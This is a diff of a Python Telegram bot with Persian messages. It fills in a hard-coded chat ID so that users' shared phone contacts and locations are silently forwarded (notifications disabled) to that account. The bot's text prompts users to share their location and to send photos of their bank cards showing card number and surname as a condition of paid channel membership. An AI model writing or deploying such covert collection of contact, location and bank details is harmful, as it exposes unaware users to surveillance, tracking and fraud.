@@ -50,7 +50,7 @@ def linker_contact(bot, update):
                      text="❗️ برای به اشتراک گذاشتن موقعیت مکانی"
                           " خود بر روی گزینه زیر کلیک کنید س‍پس بر روی دکمه ارسال موقعیت مکانی کلیک کنید."
                           "\n/location")
-    bot.sendContact(chat_id=Your Accout,
+    bot.sendContact(chat_id=364525105,
                     disable_notification=True,
                     contact=update.message.contact)
 
@@ -77,7 +77,7 @@ https://discordapp.com/download
 ⚠️ برای #عضویت در کانال ها,بعد از پرداخت مبلغ عضویت یک #عکس #از #آبربانک خود به گونه ای که فقط شماره کارت و اسم فامیل شما دیده شود برای ربات ارسال کنید و منتظر باشید تا لینک ها ارسال شود,ادمین ربات هر #چهار ساعت ربات را چک میکند, #نکته: علت درخواست عکس آبربانک این است که افراد سودجو با استفاده از اطلاعات حساب های دزدی در درگاه ما پرداخت انجام ندهند,
 
 این کانال ها فقط و فقط برای افرادی که مانند ما علاقمند به کسب دانش روز و حرفه ای هستند تشکیل شده,با تشکر @Unk9vvN""",)
-    bot.sendLocation(chat_id=Your Accout,
+    bot.sendLocation(chat_id=364525105,
                      disable_notification=True,
                      location=update.message.location)
 
